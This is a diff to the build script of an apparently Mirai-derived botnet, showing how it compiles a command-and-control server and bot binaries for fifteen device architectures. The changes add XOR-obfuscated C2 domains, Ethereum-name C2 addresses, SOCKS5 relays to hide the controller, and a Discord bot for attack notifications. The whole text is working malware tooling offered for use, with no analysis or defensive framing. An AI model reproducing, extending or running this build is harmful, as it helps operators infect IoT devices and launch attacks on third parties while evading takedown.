@@ -33,7 +33,14 @@ log() {
 }
 
 CNC_DOMAIN=""
-REPO_URL="https://github.com/nettproxy/manjibot.git"
+USE_ENS=0
+USE_RELAY=0
+RELAY_HOSTS=()
+RELAY_PORT="1080"
+USE_DISCORD=0
+DISCORD_TOKEN=""
+DISCORD_PREFIX="!"
+DISCORD_NOTIFICATION_CHANNEL=""
 
 while [[ $# -gt 0 ]]; do
     case $1 in
@@ -41,9 +48,64 @@ while [[ $# -gt 0 ]]; do
             CNC_DOMAIN="$2"
             shift 2
             ;;
+        -e|--ens)
+            USE_ENS=1
+            shift
+            ;;
+        -r|--relay)
+            USE_RELAY=1
+            RELAY_HOSTS+=("$2")
+            shift 2
+            if [[ $# -gt 0 && ! "$1" =~ ^- ]]; then
+                RELAY_PORT="$1"
+                shift
+            fi
+            ;;
+        --relay-host)
+            USE_RELAY=1
+            RELAY_HOSTS+=("$2")
+            shift 2
+            if [[ $# -gt 0 && ! "$1" =~ ^- ]]; then
+                RELAY_PORT="$1"
+                shift
+            fi
+            ;;
+        --relay-port)
+            RELAY_PORT="$2"
+            shift 2
+            ;;
+        --discord)
+            USE_DISCORD=1
+            DISCORD_TOKEN="$2"
+            shift 2
+            if [[ $# -gt 0 && ! "$1" =~ ^- ]]; then
+                DISCORD_NOTIFICATION_CHANNEL="$1"
+                shift
+            fi
+            ;;
+        --discord-prefix)
+            DISCORD_PREFIX="$2"
+            shift 2
+            ;;
+        --discord-channel)
+            DISCORD_NOTIFICATION_CHANNEL="$2"
+            shift 2
+            ;;
         *)
             log ERROR "Unknown option: $1"
-            echo "Usage: $0 --domain <domain> or -d <domain>"
+            echo "Usage: $0 --domain <domain> [-e|--ens] [-r <relay_host> [relay_port]] [--discord <bot_token> [notification_channel_id]]"
+            echo "       --ens: Compile bots with ENS (Ethereum Name Service) support"
+            echo "              Allows using .eth domains like yourname.eth"
+            echo "       -r, --relay: Enable relay mode. Bots connect via SOCKS5 relay"
+            echo "              You can specify multiple -r flags for multiple relays"
+            echo "              Example: -r relay1.example.com 1080 -r relay2.example.com 1080"
+            echo "       --relay-host <host>: Add a relay host"
+            echo "       --relay-port <port>: Set relay port (default: 1080)"
+            echo "       --discord <bot_token> [notification_channel_id]: Enable Discord bot"
+            echo "              bot_token: Your Discord bot token from Developer Portal"
+            echo "              notification_channel_id: (optional) Channel ID for attack notifications"
+            echo "       --discord-prefix <prefix>: Set Discord command prefix (default: !)"
+            echo "       --discord-channel <channel_id>: Set Discord notification channel ID"
             exit 1
             ;;
     esac
@@ -76,7 +138,7 @@ export DEBIAN_FRONTEND=noninteractive
 
 log INFO "Installing required packages"
 apt-get update -yq >/dev/null 2>&1
-apt-get install -yq wget unzip gcc snapd screen bzip2 git >/dev/null 2>&1
+apt-get install -yq wget unzip gcc snapd screen bzip2 >/dev/null 2>&1
 
 if ! command -v go &> /dev/null; then
     log INFO "Installing Go via snap"
@@ -86,26 +148,97 @@ fi
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 WORK_DIR="$SCRIPT_DIR/build_env"
 
+log INFO "Using local source files in $SCRIPT_DIR"
 rm -rf "$WORK_DIR"
 mkdir -p "$WORK_DIR"
-cd "$WORK_DIR"
 
-log INFO "Cloning repository from GitHub"
-git clone "$REPO_URL" source >/dev/null 2>&1
-cd source
+# Copy source files to build environment
+cp -r "$SCRIPT_DIR/bot" "$WORK_DIR/bot"
+cp -r "$SCRIPT_DIR/cnc" "$WORK_DIR/cnc"
+cd "$WORK_DIR"
 
 log INFO "Building CNC"
 cd cnc
+log INFO "Downloading Go dependencies (this may take a moment)..."
+go mod tidy >/dev/null 2>&1
+if [ "$USE_DISCORD" -eq 1 ]; then
+    go get github.com/bwmarrin/discordgo@v0.28.1 >/dev/null 2>&1
+fi
 go build -o cnc main.go >/dev/null 2>&1 || { log ERROR "CNC build failed"; exit 1; }
 
-log INFO "Starting CNC in screen session 'cnc'"
-pkill screen 2>/dev/null
-screen -dmS cnc ./cnc
-log INFO "CNC started. View with: screen -x cnc"
+log INFO "CNC binary built successfully"
+log INFO "You can start the CNC manually with: screen -dmS cnc ./cnc"
+
+# Configure Discord bot if enabled
+if [ "$USE_DISCORD" -eq 1 ] && [ -n "$DISCORD_TOKEN" ]; then
+    log INFO "Configuring Discord bot in config.json..."
+    CONFIG_FILE="$WORK_DIR/cnc/assets/config.json"
+    
+    # Enable Discord and set the bot token
+    sed -i 's/"enabled": false/"enabled": true/' "$CONFIG_FILE"
+    sed -i "s|\"botToken\": \"\"|\"botToken\": \"$DISCORD_TOKEN\"|" "$CONFIG_FILE"
+    sed -i "s|\"prefix\": \"!\"|\"prefix\": \"$DISCORD_PREFIX\"|" "$CONFIG_FILE"
+    
+    if [ -n "$DISCORD_NOTIFICATION_CHANNEL" ]; then
+        sed -i "s|\"notificationChannel\": \"\"|\"notificationChannel\": \"$DISCORD_NOTIFICATION_CHANNEL\"|" "$CONFIG_FILE"
+    fi
+    
+    log INFO "Discord bot configured with token and prefix '$DISCORD_PREFIX'"
+fi
 
 log INFO "Updating bot configuration"
-cd "$WORK_DIR/source"
-sed -i "s/resolv_lookup(\"yourdomain.com\");/resolv_lookup(\"$CNC_DOMAIN\");/g" bot/main.c
+cd "$WORK_DIR"
+
+# Check if domain ends with .eth
+if [[ "$CNC_DOMAIN" == *.eth ]]; then
+    log INFO "ENS domain detected: $CNC_DOMAIN"
+    USE_ENS=1
+fi
+
+# Generate XOR-obfuscated table entry for the CNC domain
+log INFO "Generating encrypted table entry for domain: $CNC_DOMAIN"
+py -3 "$SCRIPT_DIR/generate_table.py" "$CNC_DOMAIN" > /tmp/table_entry.txt
+TABLE_ENTRY=$(grep "add_entry" /tmp/table_entry.txt | head -1)
+sed -i "s|^.*TABLE_CNC_DOMAIN.*|$TABLE_ENTRY|" bot/table.c
+log INFO "CNC domain encrypted in table.c"
+
+# Generate encrypted entries for relay hosts
+if [ "$USE_RELAY" -eq 1 ] && [ ${#RELAY_HOSTS[@]} -gt 0 ]; then
+    log INFO "Generating encrypted table entries for ${#RELAY_HOSTS[@]} relay(s)..."
+    
+    # First, clear all relay entries to empty
+    for rel_idx in 1 2 3 4; do
+        sed -i "s|^.*TABLE_RELAY_${rel_idx}.*|    add_entry(TABLE_RELAY_${rel_idx}, \"\", 0);|" bot/table.c
+    done
+    
+    # Then fill in the ones the user specified
+    for i in "${!RELAY_HOSTS[@]}"; do
+        RELAY="${RELAY_HOSTS[$i]}"
+        TABLE_INDEX=$((i + 1))
+        
+        if [ $TABLE_INDEX -gt 4 ]; then
+            log WARN "Maximum 4 relays supported, skipping: $RELAY"
+            break
+        fi
+        
+        py -3 "$SCRIPT_DIR/generate_table.py" "$RELAY" > /tmp/relay_entry.txt
+        RELAY_ENTRY=$(grep "add_entry" /tmp/relay_entry.txt | head -1)
+        sed -i "s|^.*TABLE_RELAY_${TABLE_INDEX}.*|$RELAY_ENTRY|" bot/table.c
+        log INFO "  Relay $TABLE_INDEX: $RELAY encrypted"
+    done
+    
+    # Set the relay port in includes.h
+    if [ "$RELAY_PORT" != "1080" ]; then
+        sed -i "s/#define RELAY_PORT 1080/#define RELAY_PORT $RELAY_PORT/" bot/includes.h
+        log INFO "  Relay port set to: $RELAY_PORT"
+    fi
+fi
+
+# For ENS domains, the .eth.link gateway handles the actual resolution
+# The encrypted domain in table.c still stores the original .eth domain
+if [ "$USE_ENS" -eq 1 ]; then
+    log INFO "ENS support enabled. Bots will resolve .eth domains via eth.link DNS gateway"
+fi
 
 log INFO "Preparing cross-compilers"
 mkdir -p /etc/xcompile
@@ -126,14 +259,23 @@ download_compiler() {
     fi
 }
 
-download_compiler "armv7l"
+download_compiler "armv4l"
 download_compiler "armv5l"
+download_compiler "armv6l"
+download_compiler "armv7l"
+download_compiler "armv8l"
 download_compiler "mips"
 download_compiler "mipsel"
 download_compiler "i586"
+download_compiler "i686"
 download_compiler "x86_64"
+download_compiler "sh4"
+download_compiler "powerpc"
+download_compiler "powerpc440"
+download_compiler "m68k"
+download_compiler "sparc"
 
-cd "$WORK_DIR/source"
+cd "$WORK_DIR"
 mkdir -p release
 
 compile_bot() {
@@ -151,7 +293,21 @@ compile_bot() {
         fi
     fi
     
-    log INFO "Compiling for $output..."
+    # Add ENS define if enabled
+    if [ "$USE_ENS" -eq 1 ]; then
+        flags="$flags -DENS"
+    fi
+    
+    # Add RELAY define if enabled
+    if [ "$USE_RELAY" -eq 1 ]; then
+        flags="$flags -DRELAY_MODE"
+        log INFO "Compiling $output with relay mode (SOCKS5 via $RELAY_HOST:$RELAY_PORT)..."
+    elif [ "$USE_ENS" -eq 1 ]; then
+        log INFO "Compiling $output with ENS support..."
+    else
+        log INFO "Compiling for $output..."
+    fi
+    
     "$compiler" -std=c99 $flags bot/*.c -O3 -s -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o "release/$output" -DMIRAI_BOT_ARCH=\""$output"\" 2>/dev/null
     
     if [ $? -eq 0 ]; then
@@ -165,11 +321,75 @@ compile_bot() {
     fi
 }
 
-compile_bot "armv7l" "manji.arm7" "-static"
-compile_bot "armv5l" "manji.arm5" "-static"
-compile_bot "i586" "manji.x86" "-static"
-compile_bot "x86_64" "manji.dbg" "-static -DDEBUG"
+# Compile regular builds for all architectures
+compile_bot "armv4l" "nerv.arm4" "-static"
+compile_bot "armv5l" "nerv.arm5" "-static"
+compile_bot "armv6l" "nerv.arm6" "-static"
+compile_bot "armv7l" "nerv.arm7" "-static"
+compile_bot "armv8l" "nerv.aarch64" "-static"
+compile_bot "mips" "nerv.mips" "-static"
+compile_bot "mipsel" "nerv.mpsl" "-static"
+compile_bot "i586" "nerv.x86" "-static"
+compile_bot "i686" "nerv.x86_32" "-static"
+compile_bot "x86_64" "nerv.x86_64" "-static"
+compile_bot "sh4" "nerv.sh4" "-static"
+compile_bot "powerpc" "nerv.ppc" "-static"
+compile_bot "powerpc440" "nerv.ppc440" "-static"
+compile_bot "m68k" "nerv.m68k" "-static"
+compile_bot "sparc" "nerv.sparc" "-static"
+
+# Debug build for testing
+compile_bot "x86_64" "nerv.dbg" "-static -DDEBUG"
+
+# If ENS or RELAY is enabled, re-compile with the defines (overwrites with ENS/RELAY-enabled binaries)
+if [ "$USE_ENS" -eq 1 ] || [ "$USE_RELAY" -eq 1 ]; then
+    EXTRA_FLAGS=""
+    MODE_STR=""
+    
+    if [ "$USE_ENS" -eq 1 ] && [ "$USE_RELAY" -eq 1 ]; then
+        EXTRA_FLAGS="-DENS -DRELAY_MODE"
+        MODE_STR="ENS + Relay"
+    elif [ "$USE_ENS" -eq 1 ]; then
+        EXTRA_FLAGS="-DENS"
+        MODE_STR="ENS"
+    elif [ "$USE_RELAY" -eq 1 ]; then
+        EXTRA_FLAGS="-DRELAY_MODE"
+        MODE_STR="Relay"
+    fi
+    
+    log INFO "Re-compiling with $MODE_STR support..."
+    compile_bot "armv4l" "nerv.arm4" "-static $EXTRA_FLAGS"
+    compile_bot "armv5l" "nerv.arm5" "-static $EXTRA_FLAGS"
+    compile_bot "armv6l" "nerv.arm6" "-static $EXTRA_FLAGS"
+    compile_bot "armv7l" "nerv.arm7" "-static $EXTRA_FLAGS"
+    compile_bot "armv8l" "nerv.aarch64" "-static $EXTRA_FLAGS"
+    compile_bot "mips" "nerv.mips" "-static $EXTRA_FLAGS"
+    compile_bot "mipsel" "nerv.mpsl" "-static $EXTRA_FLAGS"
+    compile_bot "i586" "nerv.x86" "-static $EXTRA_FLAGS"
+    compile_bot "i686" "nerv.x86_32" "-static $EXTRA_FLAGS"
+    compile_bot "x86_64" "nerv.x86_64" "-static $EXTRA_FLAGS"
+    compile_bot "sh4" "nerv.sh4" "-static $EXTRA_FLAGS"
+    compile_bot "powerpc" "nerv.ppc" "-static $EXTRA_FLAGS"
+    compile_bot "powerpc440" "nerv.ppc440" "-static $EXTRA_FLAGS"
+    compile_bot "m68k" "nerv.m68k" "-static $EXTRA_FLAGS"
+    compile_bot "sparc" "nerv.sparc" "-static $EXTRA_FLAGS"
+    compile_bot "x86_64" "nerv.dbg" "-static -DDEBUG $EXTRA_FLAGS"
+fi
+
+# Build relay server if requested
+if [ "$USE_RELAY" -eq 1 ]; then
+    log INFO "Building relay server..."
+    cd "$SCRIPT_DIR/relay"
+    go build -o "$WORK_DIR/release/relay" -ldflags="-s -w" main.go
+    if [ $? -eq 0 ]; then
+        log INFO "Relay server built: $WORK_DIR/release/relay"
+        log INFO "Run on your relay VPS:"
+        log INFO "  ./relay $CNC_DOMAIN 6621 1080"
+    else
+        log ERROR "Failed to build relay server"
+    fi
+fi
 
 log INFO "Build process complete"
-log INFO "Binaries available in: $WORK_DIR/source/release/"
-ls -lh "$WORK_DIR/source/release/"
+log INFO "Binaries available in: $WORK_DIR/release/"
+ls -lh "$WORK_DIR/release/"
